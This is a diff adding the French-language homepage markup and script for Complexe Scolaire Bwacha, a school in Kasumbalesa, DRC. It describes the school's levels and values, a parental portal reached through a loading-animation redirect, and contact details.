+        <div class="fade-in-left">
+            <div class="hero-badge"><i class="fas fa-graduation-cap"></i> Établissement d'excellence</div>
+            <h2>Former les esprits, <span class="gradient">bâtir l'avenir</span></h2>
+            <p>Au Complexe Scolaire Bwacha, chaque apprenant est guidé vers l'excellence à travers un enseignement rigoureux, une éducation aux valeurs et un accompagnement attentif. Nous révélons le meilleur de chacun pour en faire un citoyen accompli et ambitieux.</p>
+            <div class="hero-buttons">
+                <a href="decouvir.html" class="btn-primary"><i class="fas fa-school"></i> Explorer l'établissement</a>
+                <a href="niveaux.html" class="btn-outline"><i class="fas fa-layer-group"></i> Consulter les niveaux</a>
+            </div>
+        </div>
+        <div class="hero-stats fade-in-right">
+            <div class="stat-row"><span class="label"><i class="fas fa-child"></i> Maternelle</span><span class="value">3–5 ans</span></div>
+            <div class="stat-row"><span class="label"><i class="fas fa-book-open"></i> Primaire</span><span class="value">6–11 ans</span></div>
+            <div class="stat-row"><span class="label"><i class="fas fa-user-graduate"></i> Secondaire</span><span class="value">12–18 ans</span></div>
+            <div class="stat-row"><span class="label"><i class="fas fa-chalkboard-teacher"></i> Encadrement</span><span class="value">Suivi individualisé</span></div>
+            <div class="stat-row"><span class="label"><i class="fas fa-star"></i> Devise</span><span class="value">Labeur · Rigueur · Réussite</span></div>
+        </div>
+    </div>
+
+    <div class="section-title fade-in"><i class="fas fa-flag"></i> Notre vocation <span class="line"></span></div>
+    <p class="section-sub fade-in">Révéler le potentiel de chaque apprenant et lui transmettre les savoirs, les compétences et les valeurs indispensables à la construction d'un avenir solide. De la maternelle au secondaire, nous cheminons aux côtés de chaque élève en cultivant :</p>
+    <ul class="check-grid fade-in">
+        <li><i class="fas fa-check-circle"></i> L'excellence académique</li>
+        <li><i class="fas fa-check-circle"></i> L'autonomie</li>
+        <li><i class="fas fa-check-circle"></i> La confiance en soi</li>
+        <li><i class="fas fa-check-circle"></i> La responsabilité</li>
+        <li><i class="fas fa-check-circle"></i> La persévérance</li>
+        <li><i class="fas fa-check-circle"></i> Le goût de l'effort</li>
+    </ul>
+
+    <div class="section-title fade-in"><i class="fas fa-layer-group"></i> Nos cycles d'enseignement <span class="line"></span></div>
+    <div class="grid-3">
+        <div class="card fade-in-rotate"><div class="card-icon"><i class="fas fa-child"></i></div><h3>MATERNELLE</h3><p>Les premiers jalons d'un parcours réussi. Un cadre chaleureux et éveillant pour stimuler la curiosité et l'épanouissement.</p><span class="tag">3-5 ans</span></div>
+        <div class="card fade-in-rotate"><div class="card-icon"><i class="fas fa-book-open"></i></div><h3>PRIMAIRE</h3><p>Apprendre, saisir et développer ses aptitudes. Des fondations solides pour édifier la réussite de demain.</p><span class="tag">6-11 ans</span></div>
+        <div class="card fade-in-rotate"><div class="card-icon"><i class="fas fa-user-graduate"></i></div><h3>SECONDAIRE</h3><p>Se préparer aux exigences scolaires et à l'avenir. Une formation complète pour devenir un citoyen éclairé.</p><span class="tag">12-18 ans</span></div>
+    </div>
+    <div style="text-align:center;padding:0 6% 40px 6%;">
+        <a href="niveaux.html" class="btn-niveaux"><i class="fas fa-arrow-right"></i> Voir tous les niveaux</a>
+    </div>
+
+    <div class="section-title fade-in"><i class="fas fa-mobile-alt"></i> Espace parental connecté <span class="line"></span></div>
+    <p class="section-sub fade-in">Le Complexe Scolaire Bwacha transforme le suivi scolaire grâce à un système intelligent offrant aux parents une supervision en temps réel. Fini l'attente des reçus ou des copies d'épreuves : tout devient accessible instantanément.</p>
+
+    <div class="espace-parental-wrap fade-in-scale">
+        <div class="espace-parental-card">
+            <div class="espace-top-banner">
+                <div class="etb-left">
+                    <div class="etb-icon"><i class="fas fa-brain"></i></div>
+                    <div class="etb-text">
+                        <h3>Système intelligent de suivi scolaire</h3>
+                        <p>Une solution numérique avancée au service des familles Bwacha</p>
+                    </div>
+                </div>
+                <div class="etb-tag"><i class="fas fa-bolt"></i> Temps réel</div>
+            </div>
+
+            <div class="espace-dev-banner">
+                <div class="dev-icon"><i class="fas fa-code"></i></div>
+                <div class="dev-text">
+                    <strong>Développé par la société NeTubeX SARL</strong>
+                    <span>Conception, développement et maintenance du système</span>
+                </div>
+            </div>
+
+            <div class="espace-body">
+                <div class="espace-col-left">
+                    <p class="ec-intro">Un espace numérique sécurisé qui rapproche l'école de la famille. Consultez à tout moment les progrès, la situation financière et les communications de l'établissement depuis votre téléphone.</p>
+
+                    <div class="espace-info-box">
+                        <h4><i class="fas fa-key"></i> Code parent confidentiel</h4>
+                        <p>Chaque famille reçoit un code personnel à 4 ou 6 chiffres, garantissant un accès privé et sécurisé aux informations de ses enfants.</p>
+                    </div>
+
+                    <div class="espace-code-zone">
+                        <div class="cz-icon"><i class="fas fa-phone-alt"></i></div>
+                        <div class="cz-text">
+                            <strong>Obtenir votre code parent</strong>
+                            Contactez la comptabilité au <span class="phone-number" onclick="openPhonePopup()" style="color:var(--vert);font-weight:700;cursor:pointer;">+243 973510555</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="espace-col-right">
+                    <div class="ecr-title"><i class="fas fa-list-ul"></i> Ce que vous consultez</div>
+
+                    <div class="espace-feature">
+                        <div class="ef-num">01</div>
+                        <div class="ef-content">
+                            <h4>Notes & résultats</h4>
+                            <p>Devoirs, examens, interrogations, travaux et exercices</p>
+                        </div>
+                    </div>
+                    <div class="espace-feature">
+                        <div class="ef-num">02</div>
+                        <div class="ef-content">
+                            <h4>Situation financière</h4>
+                            <p>Paiements effectués, dates et solde restant</p>
+                        </div>
+                    </div>
+                    <div class="espace-feature">
+                        <div class="ef-num">03</div>
+                        <div class="ef-content">
+                            <h4>Discipline</h4>
+                            <p>Sanctions éventuelles, motifs et dates</p>
+                        </div>
+                    </div>
+                    <div class="espace-feature">
+                        <div class="ef-num">04</div>
+                        <div class="ef-content">
+                            <h4>Communiqués</h4>
+                            <p>Actualités, annonces et informations officielles</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="espace-footer-bar">
+                <div class="efb-text">
+                    <i class="fas fa-info-circle"></i>
+                    <div class="efb-info">
+                        <h4>Accès réservé aux parents</h4>
+                        <p>Identifiez-vous avec votre code personnel pour consulter le dossier de votre enfant</p>
+                    </div>
+                </div>
+                <button class="btn-espace" id="espaceParent">
+                    <i class="fas fa-sign-in-alt"></i> Accéder à l'espace parental
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="section-title fade-in"><i class="fas fa-question-circle"></i> Pourquoi choisir Bwacha ? <span class="line"></span></div>
+    <div class="pourquoi-grid">
+        <div class="pourquoi-card fade-in-scale">
+            <h3><i class="fas fa-star"></i> UN ENSEIGNEMENT DE QUALITÉ</h3>
+            <p>Une pédagogie structurée qui favorise la progression et la réussite de chaque apprenant.</p>
+        </div>
+        <div class="pourquoi-card fade-in-scale">
+            <h3><i class="fas fa-users"></i> UN ENCADREMENT ATTENTIF</h3>
+            <p>Une surveillance rapprochée permettant de déceler les besoins de chacun et de l'accompagner avec efficacité.</p>
+        </div>
+        <div class="pourquoi-card fade-in-scale">
+            <h3><i class="fas fa-gavel"></i> UN CADRE DISCIPLINÉ</h3>
+            <p>Un milieu fondé sur le respect, la responsabilité, la ponctualité et la rigueur.</p>
+        </div>
+        <div class="pourquoi-card fade-in-scale">
+            <h3><i class="fas fa-cogs"></i> UNE FORMATION INTÉGRALE</h3>
+            <p>Au-delà des savoirs scolaires, nous développons le caractère, l'autonomie et les compétences de vie.</p>
+        </div>
+        <div class="pourquoi-card-full fade-in-scale">
+            <h3><i class="fas fa-rocket"></i> UNE VISION PROSPECTIVE</h3>
+            <p>Préparer chaque apprenant à devenir un acteur responsable, compétent et ambitieux de la société.</p>
+        </div>
+    </div>
+
+    <div class="section-title fade-in"><i class="fas fa-columns"></i> Nos trois piliers <span class="line"></span></div>
+    <div class="pillar-grid">
+        <div class="pillar-card fade-in-rotate"><div class="pillar-icon"><i class="fas fa-hammer"></i></div><h3>LABEUR</h3><p>L'effort qui édifie l'excellence. Nous cultivons la persévérance, la rigueur et le goût du travail accompli.</p></div>
+        <div class="pillar-card fade-in-rotate"><div class="pillar-icon"><i class="fas fa-balance-scale"></i></div><h3>RIGUEUR</h3><p>Les valeurs qui forgent le caractère. Respect, responsabilité, ponctualité et discipline.</p></div>
+        <div class="pillar-card fade-in-rotate"><div class="pillar-icon"><i class="fas fa-trophy"></i></div><h3>RÉUSSITE</h3><p>L'ambition de franchir ses limites. La réussite se construit par les savoirs, les compétences et la confiance en soi.</p></div>
+    </div>
+
+    <div class="section-title fade-in"><i class="fas fa-handshake"></i> Notre engagement <span class="line"></span></div>
+    <div class="engagement-block fade-in">
+        <p>Chaque enfant porte en lui un potentiel unique. Notre mission consiste à créer les conditions propices pour que ce potentiel puisse s'exprimer, progresser et se muer en réussite.<br><br>
+        <strong>AU CS BWACHA :</strong><br>
+        Nous enseignons avec exigence. Nous accompagnons avec sollicitude. Nous éduquons avec des valeurs. Nous préparons avec ambition.</p>
+    </div>
+
+    <div class="section-title fade-in"><i class="fas fa-images"></i> La vie au CS Bwacha <span class="line"></span></div>
+    <p class="section-sub fade-in">Un environnement où les élèves apprennent, échangent, participent et grandissent ensemble.</p>
+    <div class="gallery-grid">
+        <div class="gallery-item fade-in-scale"><i class="fas fa-chalkboard-teacher"></i> Classes</div>
+        <div class="gallery-item fade-in-scale"><i class="fas fa-users"></i> Élèves</div>
+        <div class="gallery-item fade-in-scale"><i class="fas fa-user-tie"></i> Enseignants</div>
+        <div class="gallery-item fade-in-scale"><i class="fas fa-running"></i> Activités</div>
+        <div class="gallery-item fade-in-scale"><i class="fas fa-building"></i> Établissement</div>
+    </div>
+
+    <div class="section-title fade-in"><i class="fas fa-heart"></i> Un mot aux parents <span class="line"></span></div>
+    <div class="parent-message fade-in">
+        <p>Choisir une école, c'est choisir une part de l'avenir de son enfant. Au Complexe Scolaire Bwacha, nous œuvrons chaque jour pour offrir aux élèves un cadre où ils peuvent apprendre, progresser et croire en leurs capacités. Parce que chaque enfant mérite une éducation qui lui ouvre les portes de l'avenir.</p>
+        <div class="signature"><i class="fas fa-quote-left" style="opacity:0.3;margin-right:8px;"></i> La direction du CS Bwacha</div>
+    </div>
+
+    <div class="section-title fade-in"><i class="fas fa-forward"></i> Prêt pour l'avenir ? <span class="line"></span></div>
+    <p class="fade-in" style="text-align:center;font-size:1.2rem;font-weight:600;color:var(--noir);padding:0 6% 8px 6%;">L'avenir de votre enfant débute aujourd'hui.</p>
+    <p class="fade-in" style="text-align:center;color:var(--gris);max-width:600px;margin:0 auto 28px;padding:0 6%;font-size:1.05rem;">Offrez-lui un cadre où le labeur, la rigueur et l'ambition deviennent les fondations de sa réussite.</p>
+    <div class="fade-in" style="display:flex;justify-content:center;gap:18px;flex-wrap:wrap;padding:0 6% 40px 6%;">
+        <a href="#" class="btn-primary"><i class="fas fa-school"></i> Visiter l'école</a>
+        <a href="#" class="btn-outline"><i class="fas fa-envelope"></i> Nous écrire</a>
+    </div>
+
+    <div class="section-title fade-in"><i class="fas fa-address-card"></i> Contact <span class="line"></span></div>
+    <div class="contact-section fade-in">
+        <div>
+            <div class="contact-title"><i class="fas fa-school"></i> COMPLEXE SCOLAIRE BWACHA</div>
+            <div class="contact-item"><i class="fas fa-envelope"></i><span>Kashiba@csbwacha.com</span></div>
+            <div class="contact-item" style="cursor:pointer;" onclick="openPhonePopup()"><i class="fas fa-phone"></i><span>+243 973510555</span></div>
+            <div class="contact-item"><i class="fas fa-map-marker-alt"></i><span>Kasumbalesa, Haut-Katanga<br>République Démocratique du Congo</span></div>
+        </div>
+        <div class="contact-side">
+            <div class="motto">LABEUR • RIGUEUR • RÉUSSITE</div>
+            <div class="copy-small">© CS BWACHA</div>
+        </div>
+    </div>
+
+    <div class="facebook-section fade-in-scale">
+        <div class="fb-content">
+            <i class="fab fa-facebook-square fb-icon"></i>
+            <div class="fb-text">
+                <h3>Suivez notre actualité</h3>
+                <p>Restez informé de la vie du <strong>Complexe Scolaire Bwacha</strong> : événements, communiqués et actualités en temps réel.</p>
+            </div>
+        </div>
+        <a href="https://www.facebook.com/share/199o7cLkwf/?mibextid=wwXIfr" target="_blank" rel="noopener noreferrer" class="btn-fb">
+            <i class="fab fa-facebook-f"></i> Visiter notre page
+        </a>
+    </div>
+
+    <div class="footer">
+        <div class="inner">
+            <div>
+                <h4>CS BWACHA</h4>
+                <p>Un établissement d'excellence à Kasumbalesa, formant les leaders de demain dans un cadre exigeant et bienveillant.</p>
+            </div>
+            <div>
+                <h4>Liens rapides</h4>
+                <a href="#">Accueil</a>
+                <a href="https://www.csbwacha.com/about">À propos</a>
+                <a href="niveaux.html">Niveaux</a>
+                <a href="enseignants.html">Enseignants</a>
+                <a href="fondateur.html">Fondateur</a>
+            </div>
+            <div>
+                <h4>Contact</h4>
+                <a href="#" class="phone-link" onclick="openPhonePopup(); return false;"><i class="fas fa-phone"></i> +243 973510555</a>
+                <a href="#"><i class="fas fa-map-marker-alt"></i> Kasumbalesa, RDC</a>
+            </div>
+        </div>
+        <div class="copy">© 2026 Complexe Scolaire Bwacha — Tous droits réservés</div>
+    </div>
+</div>
+
+<div class="loader-overlay" id="loaderOverlay">
+    <div class="loader-box">
+        <i class="fas fa-school loader-icon"></i>
+        <h2>CS BWACHA</h2>
+        <p class="loader-sub">Redirection vers l'<strong>espace parental</strong></p>
+        <div class="progress-text" id="progressText">0%</div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="loader-message">
+            <i class="fas fa-spinner"></i> Redirection en cours...
+        </div>
+    </div>
+</div>
+
+<div class="phone-popup-overlay" id="phonePopupOverlay" onclick="closePhonePopup()">
+    <div class="phone-popup-box" onclick="event.stopPropagation()">
+        <i class="fas fa-phone-alt phone-icon"></i>
+        <h2>Contactez-nous</h2>
+        <span class="phone-number">+243 973510555</span>
+        <div class="phone-buttons">
+            <a href="https://wa.me/243973510555" target="_blank" class="btn-whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a>
+            <a href="tel:+243973510555" class="btn-call"><i class="fas fa-phone"></i> Appel direct</a>
+        </div>
+        <button class="btn-close-phone" onclick="closePhonePopup()">✕ Fermer</button>
+    </div>
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var fadeElements = document.querySelectorAll('.fade-in, .fade-in-left, .fade-in-right, .fade-in-scale, .fade-in-rotate');
+        var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                }
+            });
+        }, { threshold: 0.12, rootMargin: '0px 0px -40px 0px' });
+        fadeElements.forEach(function(el) { observer.observe(el); });
+        setTimeout(function() {
+            fadeElements.forEach(function(el) {
+                if (el.getBoundingClientRect().top < window.innerHeight) {
+                    el.classList.add('visible');
+                }
+            });
+        }, 150);
+    });
+
+    var espaceBtn = document.getElementById('espaceParent');
+    var loaderOverlay = document.getElementById('loaderOverlay');
+    var progressBar = document.getElementById('progressBar');
+    var progressText = document.getElementById('progressText');
+
+    if (espaceBtn) {
+        espaceBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            loaderOverlay.classList.add('active');
+            document.body.style.overflow = 'hidden';
+            var progress = 0;
+            var interval = setInterval(function() {
+                progress += 1;
+                if (progress <= 100) {
+                    progressBar.style.width = progress + '%';
+                    progressText.textContent = progress + '%';
+                }
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(function() {
+                        window.location.href = 'https://shorturl.at/zTeGa';
+                    }, 300);
+                }
+            }, 15);
+        });
+    }
+
+    function openPhonePopup() {
+        document.getElementById('phonePopupOverlay').classList.add('active');
+        document.body.style.overflow = 'hidden';
+    }
+    function closePhonePopup() {
+        document.getElementById('phonePopupOverlay').classList.remove('active');
+        document.body.style.overflow = '';
+    }
+    document.getElementById('phonePopupOverlay').addEventListener('click', function(e) {
+        if (e.target === this) {
+            closePhonePopup();
+        }
+    });
+</script>
+</body>
+</html>
